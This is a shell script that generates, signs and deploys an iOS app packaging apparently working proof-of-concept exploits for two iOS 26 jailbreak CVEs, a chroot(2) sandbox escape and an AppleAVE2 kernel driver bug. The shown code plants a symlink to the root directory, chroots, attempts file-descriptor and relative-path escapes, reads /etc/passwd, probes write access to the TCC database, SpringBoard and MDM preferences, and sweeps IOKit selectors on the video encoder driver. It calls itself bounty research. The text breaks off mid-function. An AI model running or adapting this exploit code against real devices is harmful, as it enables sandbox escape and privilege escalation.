#!/bin/bash
# ============================================================
# ONE-COMMAND PoC DEPLOYMENT TO iPHONE 17 PRO
# ============================================================
#
# This script:
#   1. Creates an Xcode project with both PoCs (chroot + AVE2)
#   2. Builds for arm64 (device)
#   3. Signs with your development identity
#   4. Deploys to connected iPhone via ios-deploy
#
# Prerequisites:
#   - Xcode (with iOS SDK) installed
#   - iPhone connected via USB and trusted
#   - Apple Developer account configured in Xcode
#   - ios-deploy: brew install ios-deploy
#
# Usage:
#   cd ~/jb-research
#   chmod +x deploy_to_iphone.sh
#   ./deploy_to_iphone.sh
#
# If code signing fails, see "Manual Xcode deployment" at the end.
# ============================================================

set -euo pipefail

WORK="$HOME/jb-research/iphone-deploy"
rm -rf "$WORK"
mkdir -p "$WORK/JBPoC.app"

echo "========================================"
echo "  iOS 26.6.2 Jailbreak Research PoC"
echo "  Deploying to iPhone 17 Pro"
echo "========================================"
echo ""

# ---- Check prerequisites ----
echo "[1/6] Checking prerequisites..."

if ! command -v xcrun &>/dev/null; then
    echo "ERROR: Xcode command line tools not found."
    echo "  Install: xcode-select --install"
    exit 1
fi

SDK=$(xcrun --sdk iphoneos --show-sdk-path 2>/dev/null || true)
if [ -z "$SDK" ]; then
    echo "ERROR: iOS SDK not found. Install Xcode with iOS SDK."
    exit 1
fi
echo "  iOS SDK: $SDK"

CLANG=$(xcrun --sdk iphoneos -f clang 2>/dev/null)
echo "  Clang: $CLANG"

# Check for signing identity
IDENTITY=$(security find-identity -v -p codesigning | grep "Apple Development" | head -1 | awk -F'"' '{print $2}')
if [ -z "$IDENTITY" ]; then
    IDENTITY=$(security find-identity -v -p codesigning | grep "iPhone Developer" | head -1 | awk -F'"' '{print $2}')
fi
if [ -z "$IDENTITY" ]; then
    echo "WARNING: No signing identity found."
    echo "  Open Xcode → Preferences → Accounts → Add Apple ID"
    echo "  Then run this script again, or use manual Xcode deployment (see end of script)."
    IDENTITY="Apple Development"
fi
echo "  Signing identity: $IDENTITY"

HAS_IOS_DEPLOY=false
if command -v ios-deploy &>/dev/null; then
    HAS_IOS_DEPLOY=true
    echo "  ios-deploy: $(which ios-deploy)"
else
    echo "  ios-deploy: NOT FOUND (brew install ios-deploy)"
    echo "  Will create project for manual Xcode deployment instead."
fi

echo ""

# ---- Write source files ----
echo "[2/6] Writing source files..."

# Info.plist
cat > "$WORK/Info.plist" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleDevelopmentRegion</key>
    <string>en</string>
    <key>CFBundleExecutable</key>
    <string>JBPoC</string>
    <key>CFBundleIdentifier</key>
    <string>com.research.jbpoc</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundleName</key>
    <string>JBPoC</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleVersion</key>
    <string>1</string>
    <key>LSRequiresIPhoneOS</key>
    <true/>
    <key>UILaunchStoryboardName</key>
    <string></string>
    <key>UIRequiredDeviceCapabilities</key>
    <array>
        <string>arm64</string>
    </array>
    <key>UISupportedInterfaceOrientations</key>
    <array>
        <string>UIInterfaceOrientationPortrait</string>
    </array>
    <key>MinimumOSVersion</key>
    <string>26.0</string>
</dict>
</plist>
PLIST

# Entitlements
cat > "$WORK/entitlements.plist" << 'ENT'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>get-task-allow</key>
    <true/>
</dict>
</plist>
ENT

# ---- Main unified source file ----
# Combines both PoCs into a single iOS app with on-screen log output
cat > "$WORK/main.m" << 'OBJC'
/*
 * JBPoC — Unified iOS Jailbreak Research PoC
 *
 * Runs CVE-2026-43689 (chroot) and CVE-2026-84607 (AppleAVE2) PoCs
 * on the device. Results display on screen and in Console.app.
 *
 * LEGAL: Apple Security Bounty research on owned device.
 *        DMCA §1201(f)(j) exemptions apply.
 */

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <AVFoundation/AVFoundation.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/utsname.h>
#include <sys/sysctl.h>

// ============================================================
// Global log buffer — feeds both NSLog and the on-screen view
// ============================================================

static NSMutableString *g_logBuffer = nil;
static UITextView *g_logView = nil;
static dispatch_queue_t g_logQueue = nil;

static void pocLog(NSString *msg) {
    if (!g_logBuffer) g_logBuffer = [NSMutableString new];
    if (!g_logQueue) g_logQueue = dispatch_queue_create("poc.log", DISPATCH_QUEUE_SERIAL);

    NSLog(@"%@", msg);

    dispatch_async(g_logQueue, ^{
        [g_logBuffer appendString:msg];
        [g_logBuffer appendString:@"\n"];
        NSString *snapshot = [g_logBuffer copy];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (g_logView) {
                g_logView.text = snapshot;
                if (snapshot.length > 0) {
                    NSRange end = NSMakeRange(snapshot.length - 1, 1);
                    [g_logView scrollRangeToVisible:end];
                }
            }
        });
    });
}

#define LOG(fmt, ...) pocLog([NSString stringWithFormat:@"[CVE] " fmt, ##__VA_ARGS__])
#define PASS(fmt, ...) pocLog([NSString stringWithFormat:@"[+] " fmt, ##__VA_ARGS__])
#define FAIL(fmt, ...) pocLog([NSString stringWithFormat:@"[-] " fmt, ##__VA_ARGS__])
#define INFO(fmt, ...) pocLog([NSString stringWithFormat:@"[*] " fmt, ##__VA_ARGS__])

// ============================================================
// Device info collection
// ============================================================

static void printDeviceInfo(void) {
    struct utsname uts;
    uname(&uts);

    pocLog(@"========================================");
    pocLog(@"  iOS Jailbreak Research PoC Suite");
    pocLog(@"========================================");
    pocLog([NSString stringWithFormat:@"Device:  %@", [[UIDevice currentDevice] model]]);
    pocLog([NSString stringWithFormat:@"Name:    %@", [[UIDevice currentDevice] name]]);
    pocLog([NSString stringWithFormat:@"iOS:     %@", [[UIDevice currentDevice] systemVersion]]);
    pocLog([NSString stringWithFormat:@"Kernel:  %s %s", uts.release, uts.machine]);
    pocLog([NSString stringWithFormat:@"UID:     %d  PID: %d", getuid(), getpid()]);

    // Hardware model
    char hwmodel[64] = {0};
    size_t len = sizeof(hwmodel);
    sysctlbyname("hw.model", hwmodel, &len, NULL, 0);
    pocLog([NSString stringWithFormat:@"HW:      %s", hwmodel]);

    // CPU type
    char machine[64] = {0};
    len = sizeof(machine);
    sysctlbyname("hw.machine", machine, &len, NULL, 0);
    pocLog([NSString stringWithFormat:@"Machine: %s", machine]);

    pocLog(@"========================================");
    pocLog(@"");
}

// ============================================================
// CVE-2026-43689 — chroot(2) Entitlement Bypass
// ============================================================

typedef struct {
    BOOL chroot_succeeded;
    int chroot_errno;
    BOOL is_sandboxed;
    uid_t uid;
    uid_t euid;
} Q1Result;

typedef struct {
    BOOL sandbox_confused;
    BOOL can_write_outside_container;
    BOOL can_read_forbidden;
    BOOL symlink_escape_works;
    BOOL fd_escape_works;
} Q2Result;

static Q1Result testQ1_ChrootCallable(NSString *fakeRootPath) {
    Q1Result result = {0};
    result.uid = getuid();
    result.euid = geteuid();

    LOG(@"=== Q1: Can a sandboxed app call chroot(2)? ===");
    INFO(@"UID: %d, EUID: %d, PID: %d", result.uid, result.euid, getpid());

    NSString *container = NSHomeDirectory();
    result.is_sandboxed = [container containsString:@"Containers"];
    INFO(@"Container: %@", container);
    INFO(@"Sandboxed: %@", result.is_sandboxed ? @"YES" : @"NO");

    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *dirs = @[@"etc", @"tmp", @"var", @"var/mobile", @"private", @"private/var"];
    for (NSString *dir in dirs) {
        NSString *path = [fakeRootPath stringByAppendingPathComponent:dir];
        [fm createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
    }

    NSString *marker = [fakeRootPath stringByAppendingPathComponent:@"etc/.chroot_marker"];
    [@"Q1-CONFIRMED" writeToFile:marker atomically:YES encoding:NSUTF8StringEncoding error:nil];

    INFO(@"Pre-chroot baseline:");
    struct stat st;
    BOOL canStat = (stat("/etc/passwd", &st) == 0);
    INFO(@"  stat(/etc/passwd) = %@", canStat ? @"accessible" : @"blocked");
    canStat = (stat("/var/mobile", &st) == 0);
    INFO(@"  stat(/var/mobile) = %@", canStat ? @"accessible" : @"blocked");

    if (chdir([fakeRootPath UTF8String]) != 0) {
        FAIL(@"chdir to fakeroot failed: %s", strerror(errno));
        result.chroot_errno = errno;
        return result;
    }

    int ret = chroot([fakeRootPath UTF8String]);
    result.chroot_errno = errno;
    result.chroot_succeeded = (ret == 0);

    if (ret == 0) {
        PASS(@"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
        PASS(@"chroot(2) RETURNED 0 — SYSCALL SUCCEEDED");
        PASS(@"Q1 ANSWER: YES");
        PASS(@"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");

        BOOL markerExists = (stat("/etc/.chroot_marker", &st) == 0);
        PASS(@"  Marker at /etc/.chroot_marker: %@", markerExists ? @"FOUND" : @"missing");

        BOOL realPasswd = (stat("/etc/passwd", &st) == 0);
        INFO(@"  /etc/passwd visible: %@", realPasswd ? @"YES (bad — not chrooted)" : @"NO (good — chrooted)");
    } else {
        FAIL(@"chroot(2) FAILED: errno=%d (%s)", result.chroot_errno, strerror(result.chroot_errno));
        switch (result.chroot_errno) {
            case EPERM:
                FAIL(@"Q1: NO — EPERM. Root-uid check still in place.");
                FAIL(@"  Bug may require root-but-unentitled context.");
                break;
            case EACCES:
                FAIL(@"Q1: NO — EACCES. Sandbox syscall filter blocks chroot.");
                break;
            default:
                FAIL(@"Q1: NO — errno %d", result.chroot_errno);
                break;
        }
    }

    return result;
}

static Q2Result testQ2_SandboxPathConfusion(NSString *fakeRootPath) {
    Q2Result result = {0};

    LOG(@"=== Q2: Post-chroot sandbox path confusion? ===");

    // 2a: Write to "system" path (maps to fakeroot on real FS)
    {
        int fd = open("/etc/sandbox_write_test", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (fd >= 0) {
            write(fd, "test", 4);
            close(fd);
            PASS(@"2a: Wrote to /etc/ (post-chroot, maps to fakeroot)");
            unlink("/etc/sandbox_write_test");
        } else {
            FAIL(@"2a: /etc/ write blocked: %s", strerror(errno));
        }
    }

    // 2b: Write to path resembling user prefs
    {
        mkdir("/var/mobile/Library", 0755);
        mkdir("/var/mobile/Library/Preferences", 0755);
        int fd = open("/var/mobile/Library/Preferences/test.plist", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (fd >= 0) {
            write(fd, "test", 4);
            close(fd);
            INFO(@"2b: Wrote /var/mobile/Library/Preferences/test.plist");
        } else {
            INFO(@"2b: Prefs write blocked: %s", strerror(errno));
        }
    }

    // 2c: Symlink escape (pre-planted before chroot)
    {
        struct stat st;
        if (stat("/escape/etc/passwd", &st) == 0) {
            PASS(@"2c: SYMLINK ESCAPE — /escape/etc/passwd ACCESSIBLE");
            result.symlink_escape_works = YES;

            int fd = open("/escape/tmp/chroot_escape_proof", O_CREAT | O_WRONLY | O_TRUNC, 0644);
            if (fd >= 0) {
                const char *proof = "CVE-2026-43689 sandbox escape confirmed\n";
                write(fd, proof, strlen(proof));
                close(fd);
                PASS(@"2c: WROTE TO REAL /tmp VIA SYMLINK ESCAPE");
                result.sandbox_confused = YES;
                result.can_write_outside_container = YES;
            } else {
                INFO(@"2c: Symlink readable, not writable: %s", strerror(errno));
            }

            fd = open("/escape/etc/passwd", O_RDONLY);
            if (fd >= 0) {
                char buf[128];
                ssize_t n = read(fd, buf, sizeof(buf) - 1);
                close(fd);
                if (n > 0) {
                    buf[n < 60 ? n : 60] = '\0';
                    PASS(@"2c: Read /etc/passwd: %.50s...", buf);
                    result.can_read_forbidden = YES;
                }
            }
        } else {
            INFO(@"2c: /escape/etc/passwd not reachable (%s)", strerror(errno));
        }
    }

    // 2d: Relative path escape
    {
        struct stat st;
        if (stat("/../../../etc/passwd", &st) == 0) {
            PASS(@"2d: RELATIVE PATH ESCAPE WORKS");
            result.sandbox_confused = YES;
        } else {
            INFO(@"2d: Relative escape blocked: %s", strerror(errno));
        }
    }

    if (!result.sandbox_confused) {
        INFO(@"Q2 ANSWER: No path confusion detected (may need different vectors)");
    } else {
        PASS(@"Q2 ANSWER: YES — sandbox IS confused post-chroot");
    }

    return result;
}

static void testQ3_PrivilegedAccess(Q2Result q2) {
    LOG(@"=== Q3: Privileged access via confusion? ===");

    if (!q2.sandbox_confused && !q2.symlink_escape_works) {
        INFO(@"Q3: Skipping — no confusion or escape in Q2");
        return;
    }

    if (q2.can_write_outside_container) {
        PASS(@"Probing privileged targets via escape...");

        struct { const char *path; const char *desc; } targets[] = {
            {"/escape/private/var/db/TCC/TCC.db", "TCC database"},
            {"/escape/private/var/mobile/Library/Preferences/com.apple.springboard.plist", "SpringBoard prefs"},
            {"/escape/private/var/containers/Shared/SystemGroup/", "System containers"},
            {"/escape/private/preboot/Cryptexes/", "Cryptex mount point"},
            {"/escape/usr/libexec/", "System daemons"},
            {"/escape/private/var/Managed Preferences/", "MDM prefs"},
            {NULL, NULL}
        };

        for (int i = 0; targets[i].path; i++) {
            struct stat st;
            if (stat(targets[i].path, &st) == 0) {
                int w = access(targets[i].path, W_OK);
                PASS(@"  %s %s: %s",
                     w == 0 ? "[RW]" : "[RO]",
                     targets[i].desc,
                     targets[i].path);
            } else {
                INFO(@"  [--] %s: unreachable", targets[i].desc);
            }
        }
    }
}

static void plantSymlinkEscape(NSString *fakeRootPath) {
    NSString *escapePath = [fakeRootPath stringByAppendingPathComponent:@"escape"];
    unlink([escapePath UTF8String]);
    rmdir([escapePath UTF8String]);

    if (symlink("/", [escapePath UTF8String]) == 0) {
        INFO(@"Planted symlink: %@ -> /", escapePath);
    } else {
        INFO(@"Symlink to / failed: %s, trying relative...", strerror(errno));
        symlink("../../../../../../../../", [escapePath UTF8String]);
    }
}

static void runChrootPoC(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  CVE-2026-43689: chroot(2) Bypass    ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    NSString *container = NSHomeDirectory();
    NSString *fakeRoot = [container stringByAppendingPathComponent:@"Documents/fakeroot"];

    plantSymlinkEscape(fakeRoot);

    int saved_root_fd = open("/", O_RDONLY);
    INFO(@"Saved root fd: %d", saved_root_fd);

    Q1Result q1 = testQ1_ChrootCallable(fakeRoot);

    if (!q1.chroot_succeeded) {
        pocLog(@"");
        LOG(@"RESULT: chroot failed (errno=%d). Bug scope may be narrower.", q1.chroot_errno);
        if (saved_root_fd >= 0) close(saved_root_fd);
        return;
    }

    // Try fd-based chroot escape
    INFO(@"Attempting fd-based chroot escape...");
    if (saved_root_fd >= 0) {
        if (fchdir(saved_root_fd) == 0) {
            PASS(@"fchdir to saved root fd succeeded!");
            for (int i = 0; i < 20; i++) chdir("..");
            char cwd[PATH_MAX];
            if (getcwd(cwd, sizeof(cwd))) {
                INFO(@"CWD after escape: %s", cwd);
                if (strcmp(cwd, "/") == 0 || strlen(cwd) < 5) {
                    PASS(@"ESCAPED CHROOT VIA FD + CHDIR!");
                }
            }
        } else {
            INFO(@"fchdir escape failed: %s", strerror(errno));
        }
        close(saved_root_fd);
    }

    Q2Result q2 = testQ2_SandboxPathConfusion(fakeRoot);
    testQ3_PrivilegedAccess(q2);

    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  CVE-2026-43689 SUMMARY              ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog([NSString stringWithFormat:@"  Q1 chroot callable:  %@",
            q1.chroot_succeeded ? @"YES ★" : @"NO"]);
    pocLog([NSString stringWithFormat:@"  Q2 sandbox confused: %@",
            q2.sandbox_confused ? @"YES ★" : @"NO"]);
    pocLog([NSString stringWithFormat:@"     symlink escape:   %@",
            q2.symlink_escape_works ? @"YES" : @"NO"]);
    pocLog([NSString stringWithFormat:@"     fd escape:        %@",
            q2.fd_escape_works ? @"YES" : @"NO"]);
    pocLog([NSString stringWithFormat:@"     write outside:    %@",
            q2.can_write_outside_container ? @"YES ★" : @"NO"]);
    pocLog([NSString stringWithFormat:@"     read forbidden:   %@",
            q2.can_read_forbidden ? @"YES" : @"NO"]);
    pocLog(@"");
}

// ============================================================
// CVE-2026-84607 — AppleAVE2 Input Validation Bypass
// ============================================================

static void compressionOutputCallback(void *ref, void *src, OSStatus status,
                                       VTEncodeInfoFlags flags,
                                       CMSampleBufferRef buf) {
    if (status != noErr) {
        INFO(@"Encode callback: status=%d", (int)status);
    }
    if (buf) {
        PASS(@"Got encoded sample buffer from hardware encoder");
    }
}

static void testAVE2_VideoToolbox(void) {
    LOG(@"=== AVE2 Approach 1: VideoToolbox ===");

    VTCompressionSessionRef session = NULL;
    int width = 1920, height = 1080;

    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        compressionOutputCallback, NULL, &session);

    if (status != noErr) {
        INFO(@"HEVC session failed (%d), trying H.264...", (int)status);
        status = VTCompressionSessionCreate(
            kCFAllocatorDefault, width, height, kCMVideoCodecType_H264,
            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
            compressionOutputCallback, NULL, &session);
        if (status != noErr) {
            FAIL(@"H.264 also failed: %d", (int)status);
            return;
        }
        PASS(@"H.264 compression session created (AppleAVE2)");
    } else {
        PASS(@"HEVC compression session created (AppleAVE2)");
    }

    // Set properties that map to kernel-side parameters
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval,
                         (__bridge CFTypeRef)@(300));
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering,
                         kCFBooleanTrue);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel,
                         kVTProfileLevel_HEVC_Main10_AutoLevel);

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    INFO(@"PrepareToEncode: %d", (int)status);

    CVPixelBufferRef pb = NULL;
    status = CVPixelBufferCreate(kCFAllocatorDefault, width, height,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);

    if (status != noErr || !pb) {
        FAIL(@"Pixel buffer creation failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * CVPixelBufferGetHeightOfPlane(pb, 0));
    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    INFO(@"Encoding frame (sends params to AppleAVE2 kernel driver)...");

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d", (int)status);

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    INFO(@"CompleteFrames: %d", (int)status);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

static void testAVE2_IOKit(void) {
    LOG(@"=== AVE2 Approach 2: Direct IOKit ===");

    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching("AppleAVE2Driver"));

    if (svc == IO_OBJECT_NULL) {
        svc = IOServiceGetMatchingService(
            kIOMainPortDefault, IOServiceMatching("AppleAVE2"));
    }

    if (svc == IO_OBJECT_NULL) {
        INFO(@"AppleAVE2 service not found. Enumerating video services...");
        io_iterator_t iter;
        if (IOServiceGetMatchingServices(kIOMainPortDefault,
                IOServiceMatching("IOService"), &iter) == KERN_SUCCESS) {
            io_service_t s;
            int found = 0;
            while ((s = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
                io_name_t name;
                IORegistryEntryGetName(s, name);
                if (strstr(name, "AVE") || strstr(name, "Video") || strstr(name, "Encoder")) {
                    INFO(@"  Service: %s", name);
                    found++;
                }
                IOObjectRelease(s);
            }
            IOObjectRelease(iter);
            INFO(@"Found %d video services", found);
        }
        return;
    }

    PASS(@"Found AppleAVE2 service: 0x%x", svc);

    io_connect_t conn = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);

    if (kr != KERN_SUCCESS) {
        FAIL(@"IOServiceOpen failed: 0x%x (%s)", kr, mach_error_string(kr));
        INFO(@"Sandbox may block direct IOKit. Use VideoToolbox path instead.");
        return;
    }

    PASS(@"Opened AppleAVE2UserClient: 0x%x", conn);

    INFO(@"Probing external method selectors...");
    for (uint32_t sel = 0; sel < 16; sel++) {
        uint64_t out[1] = {0};
        uint32_t outCnt = 1;
        kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out, &outCnt);
        const char *desc = kr == KERN_SUCCESS ? "OK" :
                           kr == 0xe00002c2 ? "BadArgument" :
                           kr == 0xe00002c7 ? "Unsupported" :
                           kr == 0xe00002cd ? "NotPrivileged" : "Error";
        INFO(@"  Selector %2u: %s (0x%x)", sel, desc, kr);
    }

    IOServiceClose(conn);
}

// ============================================================
// AVE2 Property Dictionary Dump
// Enumerates all settable VTCompressionSession properties
// to classify which of the 97 unchecked params are reachable.
// ZERO RISK — read-only query, no encoding.
// ============================================================

static void dumpPropertyValue(NSString *key, CFTypeRef value, int indent) {
    NSString *pad = [@"" stringByPaddingToLength:indent*2 withString:@" " startingAtIndex:0];
    if (!value) {
        INFO(@"%@%@: (null)", pad, key);
        return;
    }
    CFTypeID tid = CFGetTypeID(value);
    if (tid == CFStringGetTypeID()) {
        INFO(@"%@%@: \"%@\"", pad, key, (__bridge NSString *)value);
    } else if (tid == CFNumberGetTypeID()) {
        double d;
        CFNumberGetValue(value, kCFNumberFloat64Type, &d);
        if (d == (long long)d) {
            INFO(@"%@%@: %lld", pad, key, (long long)d);
        } else {
            INFO(@"%@%@: %g", pad, key, d);
        }
    } else if (tid == CFBooleanGetTypeID()) {
        INFO(@"%@%@: %s", pad, key, CFBooleanGetValue(value) ? "YES" : "NO");
    } else if (tid == CFDictionaryGetTypeID()) {
        NSDictionary *dict = (__bridge NSDictionary *)value;
        INFO(@"%@%@: {", pad, key);
        for (NSString *k in dict) {
            dumpPropertyValue(k, (__bridge CFTypeRef)dict[k], indent + 1);
        }
        INFO(@"%@}", pad);
    } else if (tid == CFArrayGetTypeID()) {
        NSArray *arr = (__bridge NSArray *)value;
        INFO(@"%@%@: [%lu items]", pad, key, (unsigned long)arr.count);
        int i = 0;
        for (id item in arr) {
            if (i >= 10) { INFO(@"%@  ... (%lu more)", pad, (unsigned long)(arr.count - 10)); break; }
            dumpPropertyValue([NSString stringWithFormat:@"[%d]", i], (__bridge CFTypeRef)item, indent + 1);
            i++;
        }
    } else {
        INFO(@"%@%@: <%@>", pad, key, [(__bridge id)value description]);
    }
}

static void runPropertyDump(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  AVE2 Property Dictionary Dump        ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    INFO(@"Dumping all settable HEVC encoder properties...");
    INFO(@"This classifies which params the app can control.");
    pocLog(@"");

    // Create HEVC session (same as PoC)
    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1920, 1080, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        compressionOutputCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Cannot create HEVC session: %d", (int)status);
        return;
    }
    PASS(@"HEVC session created for property enumeration");

    // 1. Dump supported properties dictionary
    LOG(@"=== Supported Properties ===");
    CFDictionaryRef propDict = NULL;
    status = VTSessionCopySupportedPropertyDictionary(session, &propDict);
    if (status != noErr || !propDict) {
        FAIL(@"VTSessionCopySupportedPropertyDictionary failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    NSDictionary *props = (__bridge NSDictionary *)propDict;
    INFO(@"Total settable properties: %lu", (unsigned long)props.count);
    pocLog(@"");

    // Sort keys for consistent output
    NSArray *sortedKeys = [[props allKeys] sortedArrayUsingSelector:@selector(compare:)];

    int classA = 0, classMaybe = 0;
    for (NSString *key in sortedKeys) {
        NSDictionary *info = props[key];
        NSString *type = info[@"PropertyType"] ?: @"unknown";
        NSNumber *readWriteStatus = info[@"ReadWriteStatus"];
        NSString *rwStr = @"?";
        if ([readWriteStatus isKindOfClass:[NSNumber class]]) {
            int rw = readWriteStatus.intValue;
            rwStr = (rw == 1) ? @"ReadOnly" : (rw == 3) ? @"ReadWrite" : [NSString stringWithFormat:@"0x%x", rw];
        } else if ([readWriteStatus isKindOfClass:[NSString class]]) {
            rwStr = (NSString *)readWriteStatus;
        }

        NSString *docStr = info[@"Documentation"] ?: @"";
        NSNumber *minVal = info[@"MinimumValue"];
        NSNumber *maxVal = info[@"MaximumValue"];

        INFO(@"PROP: %@", key);
        INFO(@"  Type: %@  RW: %@", type, rwStr);
        if (minVal || maxVal) {
            INFO(@"  Range: [%@ .. %@]", minVal ?: @"?", maxVal ?: @"?");
        }
        if (docStr.length > 0 && docStr.length < 200) {
            INFO(@"  Doc: %@", docStr);
        }

        // Check for sub-properties
        NSDictionary *subProps = info[@"SupportedValueList"];
        if (subProps) {
            NSArray *vals = (NSArray *)subProps;
            if ([vals isKindOfClass:[NSArray class]] && vals.count <= 20) {
                NSMutableString *valStr = [NSMutableString string];
                for (id v in vals) {
                    if (valStr.length > 0) [valStr appendString:@", "];
                    [valStr appendFormat:@"%@", v];
                }
                INFO(@"  Values: [%@]", valStr);
            }
        }

        // Classify
        NSString *lk = [key lowercaseString];
        if ([lk containsString:@"temporal"] || [lk containsString:@"bframe"] ||
            [lk containsString:@"gop"] || [lk containsString:@"slice"] ||
            [lk containsString:@"tile"] || [lk containsString:@"reference"] ||
            [lk containsString:@"reorder"] || [lk containsString:@"layer"] ||
            [lk containsString:@"max"] || [lk containsString:@"num"]) {
            classA++;
            INFO(@"  ** CLASSIFICATION: Likely Class A (session config, CVE-relevant) **");
        }

        pocLog(@"");
    }

    INFO(@"=== SUMMARY ===");
    INFO(@"Total properties: %lu", (unsigned long)props.count);
    INFO(@"CVE-relevant (Class A candidates): %d", classA);
    pocLog(@"");

    // 2. Also query current values of key properties we know about
    LOG(@"=== Current Values of Key Properties ===");

    NSArray *keyProps = @[
        @"MaxKeyFrameInterval",
        @"MaxKeyFrameIntervalDuration",
        @"AllowFrameReordering",
        @"MaxFrameDelayCount",
        @"ProfileLevel",
        @"H264EntropyMode",
        @"RealTime",
        @"MaxH264SliceBytes",
        @"MaximizePowerEfficiency",
        @"AllowTemporalCompression",
        @"AllowOpenGOP",
        @"AverageBitRate",
        @"MoreFramesBeforeStart",
        @"MoreFramesAfterEnd",
        @"Quality",
    ];

    for (NSString *shortKey in keyProps) {
        NSString *fullKey = [NSString stringWithFormat:@"com.apple.videotoolbox.videoencoder.%@", shortKey];
        CFTypeRef val = NULL;
        status = VTSessionCopyProperty(session, (__bridge CFStringRef)fullKey, kCFAllocatorDefault, &val);
        if (status == noErr && val) {
            dumpPropertyValue(shortKey, val, 0);
            CFRelease(val);
        }
        // Also try without prefix
        val = NULL;
        status = VTSessionCopyProperty(session, (__bridge CFStringRef)shortKey, kCFAllocatorDefault, &val);
        if (status == noErr && val) {
            dumpPropertyValue(shortKey, val, 0);
            CFRelease(val);
        }
    }

    // 3. Try setting and reading TemporalLayer count (the off-by-one)
    pocLog(@"");
    LOG(@"=== Off-by-One Test: Temporal Layer Count ===");

    // Try known property keys for temporal layers
    NSArray *temporalKeys = @[
        @"TemporalLayerCount",
        @"MaxTemporalLayers",
        @"NumberOfTemporalLayers",
        @"BaseLayerFrameRate",
        @"BaseLayerFrameRateFraction",
    ];

    for (NSString *tk in temporalKeys) {
        for (int prefix = 0; prefix < 3; prefix++) {
            NSString *fullKey;
            if (prefix == 0) fullKey = tk;
            else if (prefix == 1) fullKey = [NSString stringWithFormat:@"com.apple.videotoolbox.videoencoder.%@", tk];
            else fullKey = [NSString stringWithFormat:@"TemporalCompression_%@", tk];

            // Try to read
            CFTypeRef val = NULL;
            status = VTSessionCopyProperty(session, (__bridge CFStringRef)fullKey, kCFAllocatorDefault, &val);
            if (status == noErr) {
                if (val) {
